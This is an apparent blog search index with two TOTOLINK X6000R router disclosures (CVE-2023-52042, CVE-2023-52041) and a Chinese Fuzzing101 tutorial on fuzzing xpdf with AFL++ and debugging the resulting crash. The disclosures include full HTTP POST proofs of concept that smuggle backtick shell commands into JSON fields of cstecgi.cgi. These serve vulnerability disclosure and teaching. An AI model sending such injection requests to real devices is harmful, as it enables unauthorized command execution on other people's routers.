<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2023-52042</title>
    <link href="/2024/01/13/CVE-2023-52042/"/>
    <url>/2024/01/13/CVE-2023-52042/</url>
    
    <content type="html"><![CDATA[<h1 id="Product"><a href="#Product" class="headerlink" title="Product:"></a>Product:</h1><p>TOTOLINK X6000R</p><h1 id="Version："><a href="#Version：" class="headerlink" title="Version："></a>Version：</h1><p>V9.4.0cu.852_B20230719</p><h1 id="Firmware-download-address-："><a href="#Firmware-download-address-：" class="headerlink" title="Firmware download address ："></a>Firmware download address ：</h1><p><a href="https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html">https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html</a></p><h1 id="Vulnerability-Description："><a href="#Vulnerability-Description：" class="headerlink" title="Vulnerability Description："></a>Vulnerability Description：</h1><p>In the sub_410118 function of the shttpd program, it is possible to obtain the passed values using Uci_Set_Str and then achieve arbitrary command execution through CsteSystem.</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>Execute the commands <code>ls &gt; /1.txt</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /cgi-bin/cstecgi.<span class="hljs-property">cgi</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.75</span><span class="hljs-number">.2</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-variable constant_">X11</span>; <span class="hljs-title class_">Linux</span> x86_64; <span class="hljs-attr">rv</span>:<span class="hljs-number">102.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">102.0</span><br><span class="hljs-title class_">Accept</span>: application/json, text/javascript, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">Accept-Language: en-US,en;q=0.5</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 60</span><br><span class="hljs-comment">Origin: http://192.168.75.2</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Referer: http://192.168.75.2/advance/ddns.html</span><br><span class="hljs-comment">&#123;&quot;lang&quot;:&quot; `ls &gt; /1.txt`&quot;,&quot;langAutoFlag&quot;:&quot;0&quot;,&quot;topicurl&quot;:&quot;setLanguageCfg&quot;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/CVE-2023-52042/image-20231222083137734.png" alt="1"></p><h3 id="effect"><a href="#effect" class="headerlink" title="effect"></a>effect</h3><p><img src="/../images/CVE-2023-52042/image-20231222083303879.png" alt="2"></p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>In the shttpd function, it is possible to exploit a command execution vulnerability by using the sub_4117F8 function to modify the ‘lang’ value when changing the language.</p><p><img src="/../images/CVE-2023-52042/image-20231222082846237.png" alt="3"></p><p>In Uci_Set_Str, the parameters are concatenated using snprintf and then passed into CsteSystem for execution.</p><p><img src="/../images/CVE-2023-52042/image-20240113120556134.png" alt="5"></p><p>CsteSystem:</p><p><img src="/../images/CVE-2023-52042/image-20231221160916019.png" alt="6"></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Command Execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-52041</title>
    <link href="/2024/01/13/CVE-2023-52041/"/>
    <url>/2024/01/13/CVE-2023-52041/</url>
    
    <content type="html"><![CDATA[<h1 id="Product"><a href="#Product" class="headerlink" title="Product:"></a>Product:</h1><p>TOTOLINK X6000R</p><h1 id="Version："><a href="#Version：" class="headerlink" title="Version："></a>Version：</h1><p>V9.4.0cu.852_B20230719</p><h1 id="Firmware-download-address-："><a href="#Firmware-download-address-：" class="headerlink" title="Firmware download address ："></a>Firmware download address ：</h1><p><a href="https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html">https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html</a></p><h1 id="Vulnerability-Description："><a href="#Vulnerability-Description：" class="headerlink" title="Vulnerability Description："></a>Vulnerability Description：</h1><p>In the sub_410118 function of the shttpd program, it is possible to obtain the passed values using Uci_Set_Str and then achieve arbitrary command execution through CsteSystem.</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>Execute the commands <code>ls &gt; /1.txt</code>, <code>ls &gt; /2.txt</code>, and <code>ls &gt; /3.txt</code> respectively.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /cgi-bin/cstecgi.<span class="hljs-property">cgi</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.75</span><span class="hljs-number">.2</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-variable constant_">X11</span>; <span class="hljs-title class_">Linux</span> x86_64; <span class="hljs-attr">rv</span>:<span class="hljs-number">102.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">102.0</span><br><span class="hljs-title class_">Accept</span>: application/json, text/javascript, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">Accept-Language: en-US,en;q=0.5</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 103</span><br><span class="hljs-comment">Origin: http://192.168.75.2</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Referer: http://192.168.75.2/advance/ddns.html</span><br><span class="hljs-comment">&#123;&quot;enable&quot;:&quot;1&quot;,&quot;provider&quot;:&quot;`ls &gt; /1.txt`&quot;,&quot;domain&quot;:&quot;1&quot;,&quot;username&quot;:&quot;`ls &gt; /2.txt`&quot;,&quot;password&quot;:&quot;`ls &gt; /3.txt`&quot;,&quot;topicurl&quot;:&quot;setDdnsCfg&quot;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/CVE-2023-52041/image-20231221233927561.png" alt="1"></p><h3 id="effect"><a href="#effect" class="headerlink" title="effect"></a>effect</h3><p><img src="/../images/CVE-2023-52041/image-20231221234058564.png" alt="2"></p><p><img src="/../images/CVE-2023-52041/image-20231221234121178.png" alt="3"></p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>In sub_410118,The program receives the provider, username, and password passed from the frontend, and then processes them by passing them into Uci_Set_Str.</p><p><img src="/../images/CVE-2023-52041/image-20231221233756098.png" alt="4"></p><p>In Uci_Set_Str, the parameters are concatenated using snprintf and then passed into CsteSystem for execution.</p><p><img src="/../images/CVE-2023-52041/image-20240113120556134.png" alt="5"></p><p>CsteSystem:</p><p><img src="/../images/CVE-2023-52041/image-20231221160916019.png" alt="6"></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Command Execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing101_Ex1</title>
    <link href="/2023/11/08/Fuzzing101-Ex1/"/>
    <url>/2023/11/08/Fuzzing101-Ex1/</url>
    
    <content type="html"><![CDATA[<h1 id="装软件"><a href="#装软件" class="headerlink" title="装软件"></a>装软件</h1><p>Build Xpdf:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> xpdf-3.02<br>sudo apt update &amp;&amp; sudo apt install -y build-essential gcc<br>./configure --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/&quot;</span><br>make<br>make install<br><span class="hljs-comment"># 更新软件包 并且安装gcc make </span><br><span class="hljs-comment"># 运行 configure 脚本：安装所需的开发工具后，我们将运行 所要构建的软件的 configure 脚本。 </span><br><span class="hljs-comment"># --prefix 标志指定安装目录。把它设置为 $HOME/fuzzing_xpdf/install/ 。这将在该目录中安装该软件及其关联文件。</span><br></code></pre></td></tr></table></figure><p>Time to test the build. First of all, You’ll need to download a few PDF examples:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 安装示例</span><br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br><span class="hljs-built_in">mkdir</span> pdf_examples &amp;&amp; <span class="hljs-built_in">cd</span> pdf_examples<br>wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf<br>wget http://www.africau.edu/images/default/sample.pdf<br>wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf<br></code></pre></td></tr></table></figure><h1 id="Ex1"><a href="#Ex1" class="headerlink" title="Ex1"></a>Ex1</h1><blockquote><p><a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288</a></p></blockquote><h2 id="AFL"><a href="#AFL" class="headerlink" title="AFL++"></a>AFL++</h2><p>First of all, we’re going to clean all previously compiled object files and executables:</p><p>清理编译信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 清空gcc编译内容 使用afl编译器进行编译</span><br><span class="hljs-built_in">rm</span> -r <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/xpdf-3.02/<br>make clean<br></code></pre></td></tr></table></figure><p>And now we’re going to build xpdf using the <strong>afl-clang-fast</strong> compiler:</p><p>使用afl-clang-fast 进行构建</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-comment"># export LLVM_CONFIG=&quot;llvm-config-11&quot;：这个命令设置了一个环境变量 LLVM_CONFIG，用于指定 LLVM 的配置工具的版本。它将 LLVM 的配置工具设置为 llvm-config-11。</span><br>CC=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast CXX=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast++ ./configure --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-comment"># CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++：这两个命令设置了环境变量 CC 和 CXX，用于指定 C 和 C++ 编译器。在这里，我们正在使用 AFLplusplus 提供的 afl-clang-fast 作为 C 编译器，afl-clang-fast++ 作为 C++ 编译器。这些编译器是经过修改以支持模糊测试（fuzzing）的版本。</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>跑fuzzer</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">afl-fuzz -i <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/pdf_examples/ -o <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/out/ -s 123 -- <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/bin/pdftotext @@ <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><blockquote><p>-i：表示输入文件目录<br>-o：表示 AFL++ 将存储变异文件的目录 存放fuzz过程中出现的生成的queue、crash、hang等<br>-s：表示要使用的静态随机种子（AFL 使用非确定性测试算法，因此两个Fuzz会话永远不会相同。这就是为什么设置固定种子 -s 123的原因。用以保证Fuzz结果和示例相同。）<br>@@：是占位符目标的命令行，指代文件，如果不加@@就是标准输入</p><p>-S：指定多开fuzzer就可以同时进行多个fuzzer 可以用htop查看一下当前的资源情况</p></blockquote><h3 id="分析Fuzz表"><a href="#分析Fuzz表" class="headerlink" title="分析Fuzz表"></a>分析Fuzz表</h3><p><img src="/../images/Fuzzing101-Ex1/%E5%90%AF%E5%8A%A8.png" alt="启动"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231011095548540.png" alt="image-20231011095548540"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231011095605248.png" alt="image-20231011095605248"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231011095621495.png" alt="image-20231011095621495"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231011095639165.png" alt="image-20231011095639165"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231011095857471.png" alt="image-20231011095857471"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231011095909488.png" alt="image-20231011095909488"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231011095925546.png" alt="image-20231011095925546"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231011095934952.png" alt="image-20231011095934952"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231011100026065.png" alt="image-20231011100026065"></p><p>测试错误信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/bin/pdftotext <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt; <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/output<br><br><br><span class="hljs-comment"># $HOME/fuzzing_xpdf/install/bin/pdftotext: 这是 pdftotext 程序的路径。</span><br><br><span class="hljs-comment"># &#x27;$HOME/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt;&#x27;: 这部分表示要处理的崩溃文件的路径。我们需要将 &lt;your_filename&gt; 替换为实际的崩溃文件名。</span><br><br><span class="hljs-comment"># $HOME/fuzzing_xpdf/output: 这是输出目录的路径，用于存储从崩溃文件中提取的文本内容。</span><br><br><span class="hljs-comment"># 总体来说，这个命令的目的是使用 pdftotext 工具从指定的崩溃文件中提取文本内容，并将提取的文本保存到指定的输出目录中。这通常是在模糊测试期间，当模糊测试发现程序崩溃时，用于进一步分析崩溃的内容以寻找潜在的问题。</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Fuzzing101-Ex1/image-20231106151140044.png" alt="image-20231106151140044"></p><p>首先，重建 Xpdf 以获取符号堆栈跟踪：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 删除插桩文件 使用原来的编译器 进行编译</span><br><span class="hljs-built_in">rm</span> -r <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/xpdf-3.02/<br>make clean<br>CFLAGS=<span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS=<span class="hljs-string">&quot;-g -O0&quot;</span> ./configure --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/&quot;</span><br>make<br>make install<br><br><br><span class="hljs-comment"># 这个命令是用于配置软件构建环境，并通过设置编译器标志来指定调试信息级别。</span><br><br>CFLAGS=<span class="hljs-string">&quot;-g -O0&quot;</span>：这部分设置了 C 编译器标志（`CFLAGS`）。具体来说，它设置了两个标志：<br>`-g`：这个标志告诉编译器在生成可执行文件时包括调试信息，以便在调试程序时能够查看源代码和变量值。<br>`-O0`：这个标志告诉编译器不要进行任何优化。通常，优化可能会使生成的可执行文件更有效率，但在调试时可能会导致变量值不符合预期，因此 `-O0` 禁用了所有优化。<br><br>`CXXFLAGS=<span class="hljs-string">&quot;-g -O0&quot;</span>`：类似于上述 `CFLAGS`，这部分设置了 C++ 编译器标志（`CXXFLAGS`）。<br><br>`./configure --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/&quot;</span>`：这是一个常见的配置命令，用于准备软件的构建环境。`configure` 脚本根据您的系统和设置来配置软件以进行编译，并且通过 `--prefix` 选项指定了安装目录，将安装生成的文件到 `<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/` 目录中。<br><br><span class="hljs-comment"># 这个命令的目的是配置构建环境，以便在编译过程中包括调试信息并禁用所有优化。这对于在调试期间更容易找到和解决问题非常有用。</span><br></code></pre></td></tr></table></figure><p>run！</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sh">gdb --args <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/bin/pdftotext <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/out/default/crashes/1.pdf <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/output<br><br><br><span class="hljs-comment"># 我们使用pwngdb来调试一个程序，其中包括以下部分：</span><br><br>`gdb`：启动 pwngdb 命令。<br><br>`--args`：`--args` 选项用于指定要调试的程序和它的命令行参数。<br><br>`<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/bin/pdftotext`：这是要调试的程序的路径。<br><br>`<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt;`：这是作为命令行参数传递给 `pdftotext` 的输入文件的路径。确保将 `&lt;your_filename&gt;` 替换为实际的崩溃文件名。<br><br>`<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/output`：这是输出目录的路径，我们希望在调试期间生成的任何调试信息的存储位置。<br><br>这个命令的作用是使用 `gdb` 来启动 `pdftotext` 程序，并将指定的输入文件传递给它，以便在调试期间分析和解决问题。<br>我们要确保替换 `&lt;your_filename&gt;` 为实际的崩溃文件名。<br></code></pre></td></tr></table></figure><h2 id="找洞过程"><a href="#找洞过程" class="headerlink" title="找洞过程"></a>找洞过程</h2><h3 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h3><p>我们输入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/bin/pdftotext <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt; <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><p><img src="/../images/Fuzzing101-Ex1/image-20231010171638953.png" alt="image-20231010171638953"></p><p>可以发现这里出现了问题 我们尝试使用gdb进入看一下</p><blockquote><p>一定注意先 start 然后再run 直接run会直接退出来 程序崩溃</p></blockquote><p><img src="/../images/Fuzzing101-Ex1/image-20231010172135561.png" alt="image-20231010172135561"></p><p>如图所示 我们能发现getObj函数 循环调用 我们知道不断运行函数时候 会一直分配栈帧 导致程序溢出出错 我们直接拎出来这段代码来看。我们这样看，并不知道到底怎么发生了无限调用，我们等会进行动态分析的时候会查看。</p><p><img src="/../images/Fuzzing101-Ex1/image-20231010173320738.png" alt="image-20231010173320738"></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>我们首先拿出新旧版本的源码进行对比</p><p><img src="/../images/Fuzzing101-Ex1/image-20231010173750421.png" alt="image-20231010173750421"></p><p>我们发现 只是添加了一个 recursionLimit的参数 当我在困惑这个recursionLimit是怎么计算的时候 我发现 原来直接给了一个宏变量</p><p><img src="/../images/Fuzzing101-Ex1/image-20231010174329369.png" alt="image-20231010174329369"></p><p>直接给了 500的宏变量 限制了循环次数</p><h2 id="细致分析"><a href="#细致分析" class="headerlink" title="细致分析"></a>细致分析</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>追踪程序流</p><p><img src="/../images/Fuzzing101-Ex1/image-20231011170731691.png" alt="image-20231011170731691"></p><p>我们这里可以清楚的发现 这6个函数 会进行不断分析 我们试着去溯源分析一下这个函数是怎么调用的</p><p>我们猜测 XRef::fetch为该函数的起点 我们试着往上去找 这个函数 我们首先进入main函数搜索</p><p><img src="/../images/Fuzzing101-Ex1/image-20231011171110498.png" alt="image-20231011171110498"></p><p>无果</p><p>看来需要再找调用的地方</p><p>我们直接使用bt 追溯一下 看看如何调用 如图所示 但并未发现main函数在哪进入 但我们有新的发现</p><p><img src="/../images/Fuzzing101-Ex1/image-20231011171831411.png" alt="image-20231011171831411"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231104195743717.png" alt="image-20231104195743717"></p><p>此时也是给了我们线索 但是我们还是无法回溯到main函数</p><p>我们尝试使用ida 找交叉引用</p><p><img src="/../images/Fuzzing101-Ex1/image-20231011174634595.png" alt="image-20231011174634595"></p><p>我们先找到Parser::getObj这个函数 然后往上追追试试</p><p><img src="/../images/Fuzzing101-Ex1/image-20231011175018807.png" alt="image-20231011175018807"></p><p>我们看到了熟悉的XRef::fetch 然后查看fetch 就步入试试</p><p><img src="/../images/Fuzzing101-Ex1/image-20231011174953655.png" alt="image-20231011174953655"></p><p>我们发现多次的引用</p><p><img src="/../images/Fuzzing101-Ex1/image-20231011175105037.png" alt="image-20231011175105037"></p><p>我们先不管 先继续往上找引用</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107150449929.png" alt="image-20231107150449929"></p><p>这里我们直接继续跟进XRdf::getCatalog试试</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107150534876.png" alt="image-20231107150534876"></p><p>这个函数 也是非常的简单 我们接着往上找引用</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107150558824.png" alt="image-20231107150558824"></p><p>我们看看Catalog::Catalog</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107151423711.png" alt="image-20231107151423711"></p><p>继续往上跟进</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107151444674.png" alt="image-20231107151444674"></p><p>我们观察PDFDoc::setup继续跟</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107151512994.png" alt="image-20231107151512994"></p><p>然后观察Page::PDFDoc</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107151554987.png" alt="image-20231107151554987"></p><p>观察PDFDoc::PDFDoc之后</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107151733117.png" alt="image-20231107151733117"></p><p>我们继续跟</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107151754035.png" alt="image-20231107151754035"></p><p>我们也是成功的来到了main函数中</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107151819201.png" alt="image-20231107151819201"></p><p>这样我们就大致完成了 程序流的跟踪</p><p>我们从前往后开始分析源码后发现程序的执行流是这样的</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust">main———&gt;PDFDoc::PDFDoc———&gt;PDFDoc::setup———&gt;Catalog::Catalog———&gt;XRdf::getCatalog———&gt;XRef::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, newobj)<br>———&gt;Parser::getObj———&gt;Parser::makeStream———&gt;dict<span class="hljs-punctuation">-&gt;</span><span class="hljs-title function_ invoke__">dictLookup</span>(<span class="hljs-string">&quot;Length&quot;</span>, &amp;obj)———&gt;xRef<span class="hljs-punctuation">-&gt;</span><span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-number">7</span>, <span class="hljs-number">0</span>, newobj)<br></code></pre></td></tr></table></figure><p>我们明白了程序流程以后 为我们就可以尝试开始进行数据流的分析了 看看我们如何来触发这个crash</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>我们先找到程序断点 当我们不断ni 到这一步的时候 程序会自己断掉 我们步入看看情况</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031093626523.png" alt="image-20231031093626523"></p><p>从这一步 步入函数</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031093854979.png" alt="image-20231031093854979"></p><p>这里新建一个PDFDoc对象时  这时候我们打开PDFDoc来看 我们发现在这一步 也会导致程序崩溃   </p><p><img src="/../images/Fuzzing101-Ex1/image-20231031095440295.png" alt="image-20231031095440295"></p><p>我们并没有传入密码 两项应该都为0  这个没问题</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031111611560.png" alt="image-20231031111611560"></p><p>我们接着接着步入setup里面</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031111315473.png" alt="image-20231031111315473"></p><p>首先进行检查head xref_table表</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031111839593.png" alt="image-20231031111839593"></p><p>走到这一步 我们发现又创建了一个Catalog对象</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031112029552.png" alt="image-20231031112029552"></p><p>这里我们跟进一下 </p><p><img src="/../images/Fuzzing101-Ex1/image-20231031113244419.png" alt="image-20231031113244419"></p><p>进去以后我们会发现有一个 直接调用xRef的</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031113312365.png" alt="image-20231031113312365"></p><p>我们在xRef.cc中并未找到这个类</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031113948929.png" alt="image-20231031113948929"></p><p>我们尝试去头文件里找一找，我们打开xRef.h 发现了如下定义</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031144149796.png" alt="image-20231031144149796"></p><p>这时候我们相当于获得了一个Object::fetch</p><p>我们接着找Object::fetch</p><p>在Object.cc中我们找到了这段调用</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031151606513.png" alt="image-20231031151606513"></p><p>上面代码的含义如下：</p><p>如果当前 <code>Object</code> 对象是引用对象，并且存在有效的 <code>XRef</code> 对象 (<code>xref</code> 不为 <code>nullptr</code>)，则调用 <code>xref-&gt;fetch</code> 方法来获取引用的对象；否则，可能执行一个复制操作（<code>copy(obj)</code>）</p><p>通俗来说 也就是 将Object::fetch 封装为了xref——&gt;fetch 然后往里面传入了参数ref.num ref.gen obj&#x3D;&amp;catDict</p><p>这里我们看到三个参数 分别为 5 0 0x7fffffffdab0</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031154351478.png" alt="image-20231031154351478"></p><p>在步入以后 我们流进了xRef.cc的789行</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031154710677.png" alt="image-20231031154710677"></p><p>接着往下走 我们就走到了无限递归的位置</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031155323749.png" alt="image-20231031155323749"></p><p>我们再进去看一下Parser—&gt;getObj的调用过程 此时我们发现 obj重新构建了一个Dict对象 </p><p><img src="/../images/Fuzzing101-Ex1/image-20231031160641469.png" alt="image-20231031160641469"></p><p>然后开始调用getObj</p><p><img src="/../images/Fuzzing101-Ex1/image-20231031164837290.png" alt="image-20231031164837290"></p><p>跑完循环后 我们就跑进了makeStream里(如果调试觉得太慢 调不出来 可以直接下断点去看)</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107160328841.png" alt="image-20231107160328841"></p><p>走到dict——&gt;dictLookup进入</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107170645185.png" alt="image-20231107170645185"></p><p><img src="/../images/Fuzzing101-Ex1/image-20231107164326476.png" alt="image-20231107164326476"></p><p>进入以后看到</p><figure class="highlight 